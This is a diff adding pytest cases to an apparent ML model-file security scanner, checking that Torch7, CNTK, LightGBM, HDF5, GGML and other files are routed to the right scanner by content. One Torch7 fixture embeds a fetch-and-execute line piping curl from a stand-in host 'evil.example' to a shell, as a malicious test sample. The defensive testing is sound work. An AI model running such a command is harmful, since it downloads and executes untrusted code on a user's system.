@@ -3,6 +3,7 @@ import gzip
 import io
 import json
 import lzma
+import os
 import pickle
 import tarfile
 import zipfile
@@ -69,6 +70,24 @@ def _write_gzip_joblib_pickle(path: Path) -> Path:
 def _write_gzip_r_serialized(path: Path, body: str) -> Path:
     with gzip.open(path, "wb") as stream:
         stream.write(f"RDX2\nX\n{body}".encode())
+    return path
+
+
+def _write_cntkv2(path: Path, include_structure: bool = True) -> Path:
+    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
+    structure = b" CompositeFunction primitive_functions " if include_structure else b""
+    path.write_bytes(prefix + structure + b" inputs outputs ")
+    return path
+
+
+def _write_lightgbm(path: Path, valid: bool = True) -> Path:
+    body = "tree=0\nversion=v4\nnum_class=1\n"
+    if valid:
+        body += (
+            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\n"
+            "num_leaves=2\nsplit_feature=0\nleaf_value=0.1 0.2\n"
+        )
+    path.write_text(body, encoding="utf-8")
     return path
 
 
@@ -413,6 +432,31 @@ def test_get_scanner_for_path_routes_raw_pickle_torch_suffixes_to_pickle(
     _assert_scanner_for_path(model_path, expected_scanner_name)
 
 
+@pytest.mark.parametrize("protocol", [1, 4])
+def test_get_scanner_for_path_keeps_torch_marker_pickle_on_pickle_scanner(tmp_path: Path, protocol: int) -> None:
+    model_path = tmp_path / "marker-checkpoint.pt"
+    model_path.write_bytes(pickle.dumps({"weights": b"\x00torch.FloatTensor nn.Sequential"}, protocol=protocol))
+
+    _assert_scanner_for_path(model_path, "pickle")
+
+
+def test_get_scanner_for_path_keeps_pickle_with_appended_ascii_torch7_header_on_pickle_scanner(tmp_path: Path) -> None:
+    model_path = tmp_path / "appended-header.pt"
+    model_path.write_bytes(
+        pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
+        + b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+    )
+
+    _assert_scanner_for_path(model_path, "pickle")
+
+
+def test_get_scanner_for_path_routes_marker_form_torch7_pt_to_torch7(tmp_path: Path) -> None:
+    model_path = tmp_path / "marker-checkpoint.pt"
+    model_path.write_bytes(b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example | sh')\n")
+
+    _assert_scanner_for_path(model_path, "torch7")
+
+
 def test_get_scanner_for_path_routes_raw_bin_payload_to_pytorch_binary(tmp_path: Path) -> None:
     model_path = tmp_path / "model.bin"
     model_path.write_bytes(b"\x00" * 128)
@@ -498,6 +542,53 @@ def test_get_scanner_for_file_rejects_rar_suffix_without_magic(tmp_path: Path) -
     assert scanner is None
 
 
+def test_get_scanner_for_file_routes_hdf5_header_alias_under_misleading_suffix(tmp_path: Path) -> None:
+    path = tmp_path / "model.jpg"
+    path.write_bytes(b"\x89HDF\r\n\x1a\n" + b"\x00" * 32)
+
+    scanner = get_scanner_for_file(str(path))
+
+    assert scanner is not None
+    assert scanner.name == "keras_h5"
+
+
+def test_get_scanner_for_file_routes_ggml_header_alias_and_rejects_near_match(tmp_path: Path) -> None:
+    path = tmp_path / "model.jpg"
+    path.write_bytes(b"GGML" + (1).to_bytes(4, "little") + b"\x00" * 24)
+    near_match = tmp_path / "not-model.jpg"
+    near_match.write_bytes(b"GGMX" + (1).to_bytes(4, "little") + b"\x00" * 24)
+
+    scanner = get_scanner_for_file(str(path))
+
+    assert scanner is not None
+    assert scanner.name == "gguf"
+    assert get_scanner_for_file(str(near_match)) is None
+
+
+def test_get_scanner_for_file_does_not_override_r_serialized_suffix_with_compressed_alias(tmp_path: Path) -> None:
+    path = tmp_path / "not-r.rds"
+    path.write_bytes(gzip.compress(pickle.dumps({"weights": [1, 2, 3]}, protocol=4)))
+
+    assert get_scanner_for_file(str(path)) is None
+
+
+def test_get_scanner_for_path_preserves_r_serialized_owner_after_failed_zip_probe(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = _write_gzip_r_serialized(tmp_path / "workspace.rds", "workspace\nmodel")
+
+    def raise_zip_error(_path: str) -> bool:
+        raise OSError("simulated ZIP probe read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
+
+    scanner_class = ScannerRegistry().get_scanner_for_path(str(path))
+
+    assert scanner_class is not None
+    assert scanner_class.name == "r_serialized"
+
+
 def test_get_scanner_for_path_routes_valid_mar_archive_to_torchserve_mar(tmp_path: Path) -> None:
     mar_path = _write_zip_archive(
         tmp_path / "model.mar",
@@ -576,6 +667,28 @@ def test_get_scanner_for_path_routes_extensionless_readme_to_metadata_scanner(tm
     _assert_scanner_for_path(readme_path, "metadata")
 
 
+def test_get_scanner_for_path_routes_misnamed_torch7_by_content(tmp_path: Path) -> None:
+    torch7_path = tmp_path / "payload.jpg"
+    torch7_path.write_bytes(b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n")
+
+    _assert_scanner_for_path(torch7_path, "torch7")
+
+
+@pytest.mark.parametrize("filename", ["payload.onnx", "payload.pt", "payload.gz", "payload.tar.gz"])
+def test_get_scanner_for_path_prioritizes_torch7_over_recognized_suffix(tmp_path: Path, filename: str) -> None:
+    torch7_path = tmp_path / filename
+    torch7_path.write_bytes(b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n")
+
+    _assert_scanner_for_path(torch7_path, "torch7")
+
+
+def test_get_scanner_for_path_does_not_route_misnamed_torch_source_text(tmp_path: Path) -> None:
+    source_path = tmp_path / "source.jpg"
+    source_path.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")
+
+    assert ScannerRegistry().get_scanner_for_path(str(source_path)) is None
+
+
 def test_get_scanner_for_path_routes_extensionless_llamafile(tmp_path: Path) -> None:
     llamafile_path = tmp_path / "llama"
     llamafile_path.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime")
@@ -607,6 +720,88 @@ def test_get_scanner_for_path_routes_extensionless_malicious_llamafile(tmp_path:
     )
 
     _assert_scanner_for_path(llamafile_path, "llamafile")
+
+
+def test_get_scanner_for_path_routes_renamed_cntk_by_content(tmp_path: Path) -> None:
+    renamed_cntk = _write_cntkv2(tmp_path / "cntk.jpg")
+
+    _assert_scanner_for_path(renamed_cntk, "cntk")
+
+
+def test_get_scanner_for_path_routes_renamed_lightgbm_by_content(tmp_path: Path) -> None:
+    renamed_lightgbm = _write_lightgbm(tmp_path / "lightgbm.jpg")
+
+    _assert_scanner_for_path(renamed_lightgbm, "lightgbm")
+
+
+def test_get_scanner_for_path_does_not_route_cntk_or_lightgbm_near_matches(tmp_path: Path) -> None:
+    cntk_near_match = _write_cntkv2(tmp_path / "cntk-near-match.jpg", include_structure=False)
+    lightgbm_near_match = _write_lightgbm(tmp_path / "lightgbm-near-match.jpg", valid=False)
+
+    assert ScannerRegistry().get_scanner_for_path(str(cntk_near_match)) is None
+    assert ScannerRegistry().get_scanner_for_path(str(lightgbm_near_match)) is None
+
+
+@pytest.mark.parametrize(
+    ("filename", "scanner_name"),
+    [
+        ("unreadable.mlmodel", "coreml"),
+        ("unreadable.safetensors", "safetensors"),
+        ("unreadable.engine", "tensorrt"),
+    ],
+)
+def test_get_scanner_for_path_routes_owned_binary_model_after_zip_probe_read_failure(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    filename: str,
+    scanner_name: str,
+) -> None:
+    unreadable_model = tmp_path / filename
+    unreadable_model.write_bytes(b"simulated unavailable model bytes")
+
+    def raise_read_error(_path: str) -> bool:
+        raise OSError("simulated ZIP probe read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_read_error)
+    monkeypatch.setattr(
+        "modelaudit.scanners.coreml_scanner.CoreMLScanner.can_handle",
+        classmethod(lambda _cls, _path: True),
+    )
+
+    _assert_scanner_for_path(unreadable_model, scanner_name)
+
+
+def test_get_scanner_for_path_routes_owned_metagraph_after_zip_probe_read_failure(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    unreadable_meta = tmp_path / "unreadable.meta"
+    unreadable_meta.write_bytes(b"simulated metagraph bytes")
+
+    def raise_read_error(_path: str) -> bool:
+        raise OSError("simulated ZIP probe read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_read_error)
+    monkeypatch.setattr(
+        "modelaudit.scanners.tf_metagraph_scanner.TensorFlowMetaGraphScanner.can_handle",
+        classmethod(lambda _cls, _path: True),
+    )
+
+    _assert_scanner_for_path(unreadable_meta, "tf_metagraph")
+
+
+def test_get_scanner_for_path_does_not_route_pickle_after_zip_probe_read_failure(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    unreadable_pickle = _write_safe_pickle(tmp_path / "unreadable.pkl")
+
+    def raise_read_error(_path: str) -> bool:
+        raise OSError("simulated ZIP probe read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_read_error)
+
+    assert ScannerRegistry().get_scanner_for_path(str(unreadable_pickle)) is None
 
 
 def test_get_scanner_for_path_routes_misnamed_malicious_llamafile(tmp_path: Path) -> None:
@@ -693,3 +888,118 @@ def test_get_scanner_for_path_routes_generic_pkl_zip_without_pytorch_markers_to_
     model_path = _write_zip_archive(tmp_path / "generic.pkl", {"payload.txt": b"not a pytorch archive"})
 
     _assert_scanner_for_path(model_path, "zip")
+
+
+@pytest.mark.parametrize(
+    ("filename", "scanner_name"),
+    [
+        ("README", "metadata"),
+        ("README.md", "metadata"),
+        ("model_card", "metadata"),
+        ("unreadable.npy", "numpy"),
+        ("unreadable.pdmodel", "paddle"),
+        ("unreadable.bin", "pytorch_binary"),
+        ("unreadable.pb", "tf_savedmodel"),
+        ("config.json", "manifest"),
+        ("vocab.txt", "text"),
+    ],
+)
+def test_get_scanner_for_path_preserves_read_failure_aware_owner_after_failed_zip_probe(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    filename: str,
+    scanner_name: str,
+) -> None:
+    path = tmp_path / filename
+    path.write_bytes(b"owned unreadable model payload")
+
+    def raise_zip_error(_path: str) -> bool:
+        raise OSError("simulated ZIP probe read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
+    monkeypatch.setattr("modelaudit.scanners.paddle_scanner.HAS_PADDLE", True)
+
+    scanner_class = ScannerRegistry().get_scanner_for_path(str(path))
+
+    assert scanner_class is not None
+    assert scanner_class.name == scanner_name
+
+
+def test_get_scanner_for_path_preserves_npz_zip_owner_after_failed_zip_probe_read_failure(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = _write_zip_archive(tmp_path / "unreadable.npz", {"weights.npy": b"safe array payload"})
+
+    def raise_zip_error(*_args: object, **_kwargs: object) -> bool:
+        raise OSError("simulated ZIP probe read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
+    monkeypatch.setattr("modelaudit.scanners.zip_scanner.zipfile.ZipFile", raise_zip_error)
+
+    scanner_class = ScannerRegistry().get_scanner_for_path(str(path))
+
+    assert scanner_class is not None
+    assert scanner_class.name == "zip"
+
+
+def test_get_scanner_for_path_does_not_claim_pickle_after_failed_zip_probe(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "unreadable.pkl"
+    path.write_bytes(b"unreadable generic pickle candidate")
+
+    def raise_zip_error(_path: str) -> bool:
+        raise OSError("simulated ZIP probe read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
+
+    assert ScannerRegistry().get_scanner_for_path(str(path)) is None
+
+
+def test_get_scanner_for_path_does_not_claim_generic_text_after_failed_zip_probe(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "notes.txt"
+    path.write_text("ordinary notes\n", encoding="utf-8")
+
+    def raise_zip_error(_path: str) -> bool:
+        raise OSError("simulated ZIP probe read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
+
+    assert ScannerRegistry().get_scanner_for_path(str(path)) is None
+
+
+@pytest.mark.parametrize(
+    ("filename", "scanner_name"),
+    [
+        ("unavailable.mlmodel", "coreml"),
+        ("unavailable.onnx", None),
+        ("unavailable.rds", "r_serialized"),
+    ],
+)
+def test_get_scanner_for_path_limits_unreadable_extension_routing_to_read_failure_aware_scanners(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    filename: str,
+    scanner_name: str | None,
+) -> None:
+    path = tmp_path / filename
+    path.write_bytes(b"X\nsafe\nmodel")
+    real_access = os.access
+
+    def unreadable_path(candidate: str, mode: int) -> bool:
+        return False if candidate == str(path) and mode == os.R_OK else real_access(candidate, mode)
+
+    monkeypatch.setattr(os, "access", unreadable_path)
+
+    scanner_class = ScannerRegistry().get_scanner_for_path(str(path))
+
+    if scanner_name is None:
+        assert scanner_class is None
+    else:
+        assert scanner_class is not None
+        assert scanner_class.name == scanner_name
